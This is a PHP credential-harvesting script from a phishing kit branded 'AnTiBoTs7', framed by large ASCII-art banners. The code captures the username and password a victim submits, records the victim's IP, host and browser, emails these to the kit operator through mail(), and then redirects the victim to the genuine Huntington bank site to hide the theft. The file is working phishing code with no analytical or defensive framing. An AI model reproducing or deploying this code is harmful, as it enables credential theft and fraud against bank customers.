<?php
   /*


               AAA                           TTTTTTTTTTTTTTTTTTTTTTT  iiii  BBBBBBBBBBBBBBBBB                 TTTTTTTTTTTTTTTTTTTTTTT          77777777777777777777
              A:::A                          T:::::::::::::::::::::T i::::i B::::::::::::::::B                T:::::::::::::::::::::T          7::::::::::::::::::7
             A:::::A                         T:::::::::::::::::::::T  iiii  B::::::BBBBBB:::::B               T:::::::::::::::::::::T          7::::::::::::::::::7
            A:::::::A                        T:::::TT:::::::TT:::::T        BB:::::B     B:::::B              T:::::TT:::::::TT:::::T          777777777777:::::::7
           A:::::::::A         nnnn  nnnnnnnnTTTTTT  T:::::T  TTTTTTiiiiiii   B::::B     B:::::B   oooooooooooTTTTTT  T:::::T  TTTTTTssssssssss           7::::::7
          A:::::A:::::A        n:::nn::::::::nn      T:::::T        i:::::i   B::::B     B:::::B oo:::::::::::oo      T:::::T      ss::::::::::s         7::::::7
         A:::::A A:::::A       n::::::::::::::nn     T:::::T         i::::i   B::::BBBBBB:::::B o:::::::::::::::o     T:::::T    ss:::::::::::::s       7::::::7
        A:::::A   A:::::A      nn:::::::::::::::n    T:::::T         i::::i   B:::::::::::::BB  o:::::ooooo:::::o     T:::::T    s::::::ssss:::::s     7::::::7
       A:::::A     A:::::A       n:::::nnnn:::::n    T:::::T         i::::i   B::::BBBBBB:::::B o::::o     o::::o     T:::::T     s:::::s  ssssss     7::::::7
      A:::::AAAAAAAAA:::::A      n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T       s::::::s         7::::::7
     A:::::::::::::::::::::A     n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T          s::::::s     7::::::7
    A:::::AAAAAAAAAAAAA:::::A    n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T    ssssss   s:::::s  7::::::7
   A:::::A             A:::::A   n::::n    n::::n  TT:::::::TT      i::::::iBB:::::BBBBBB::::::Bo:::::ooooo:::::o   TT:::::::TT  s:::::ssss::::::s7::::::7
  A:::::A               A:::::A  n::::n    n::::n  T:::::::::T      i::::::iB:::::::::::::::::B o:::::::::::::::o   T:::::::::T  s::::::::::::::s7::::::7
 A:::::A                 A:::::A n::::n    n::::n  T:::::::::T      i::::::iB::::::::::::::::B   oo:::::::::::oo    T:::::::::T   s:::::::::::ss7::::::7
AAAAAAA                   AAAAAAAnnnnnn    nnnnnn  TTTTTTTTTTT      iiiiiiiiBBBBBBBBBBBBBBBBB      ooooooooooo      TTTTTTTTTTT    sssssssssss 77777777


   */
include('Email.php');

$ip = getenv("REMOTE_ADDR");
$message .= "--------------------AnTiBoTs7-------------------\n";
$message .= "--------------  LOGIN -------------\n";
$message .= "EMAIL       : ".$_POST['Username']."\n";
$message .= "PASSWORD       : ".$_POST['Password']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------AnTiBoTs7----------------------\n";
$cc = $_POST['ccn'];
$subject = "Email account | ♥__♥ | IP : $ip\n ";
$headers = "From: <noreply@antibots7.com>\n";
mail($send,$subject,$message,$headers);

header("Location: https://www.huntington.com");?>
<!--    /*


               AAA                           TTTTTTTTTTTTTTTTTTTTTTT  iiii  BBBBBBBBBBBBBBBBB                 TTTTTTTTTTTTTTTTTTTTTTT          77777777777777777777
              A:::A                          T:::::::::::::::::::::T i::::i B::::::::::::::::B                T:::::::::::::::::::::T          7::::::::::::::::::7
             A:::::A                         T:::::::::::::::::::::T  iiii  B::::::BBBBBB:::::B               T:::::::::::::::::::::T          7::::::::::::::::::7
            A:::::::A                        T:::::TT:::::::TT:::::T        BB:::::B     B:::::B              T:::::TT:::::::TT:::::T          777777777777:::::::7
           A:::::::::A         nnnn  nnnnnnnnTTTTTT  T:::::T  TTTTTTiiiiiii   B::::B     B:::::B   oooooooooooTTTTTT  T:::::T  TTTTTTssssssssss           7::::::7
          A:::::A:::::A        n:::nn::::::::nn      T:::::T        i:::::i   B::::B     B:::::B oo:::::::::::oo      T:::::T      ss::::::::::s         7::::::7
         A:::::A A:::::A       n::::::::::::::nn     T:::::T         i::::i   B::::BBBBBB:::::B o:::::::::::::::o     T:::::T    ss:::::::::::::s       7::::::7
        A:::::A   A:::::A      nn:::::::::::::::n    T:::::T         i::::i   B:::::::::::::BB  o:::::ooooo:::::o     T:::::T    s::::::ssss:::::s     7::::::7
       A:::::A     A:::::A       n:::::nnnn:::::n    T:::::T         i::::i   B::::BBBBBB:::::B o::::o     o::::o     T:::::T     s:::::s  ssssss     7::::::7
      A:::::AAAAAAAAA:::::A      n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T       s::::::s         7::::::7
     A:::::::::::::::::::::A     n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T          s::::::s     7::::::7
    A:::::AAAAAAAAAAAAA:::::A    n::::n    n::::n    T:::::T         i::::i   B::::B     B:::::Bo::::o     o::::o     T:::::T    ssssss   s:::::s  7::::::7
   A:::::A             A:::::A   n::::n    n::::n  TT:::::::TT      i::::::iBB:::::BBBBBB::::::Bo:::::ooooo:::::o   TT:::::::TT  s:::::ssss::::::s7::::::7
  A:::::A               A:::::A  n::::n    n::::n  T:::::::::T      i::::::iB:::::::::::::::::B o:::::::::::::::o   T:::::::::T  s::::::::::::::s7::::::7
 A:::::A                 A:::::A n::::n    n::::n  T:::::::::T      i::::::iB::::::::::::::::B   oo:::::::::::oo    T:::::::::T   s:::::::::::ss7::::::7
AAAAAAA                   AAAAAAAnnnnnn    nnnnnn  TTTTTTTTTTT      iiiiiiiiBBBBBBBBBBBBBBBBB      ooooooooooo      TTTTTTTTTTT    sssssssssss 77777777


   */ -->
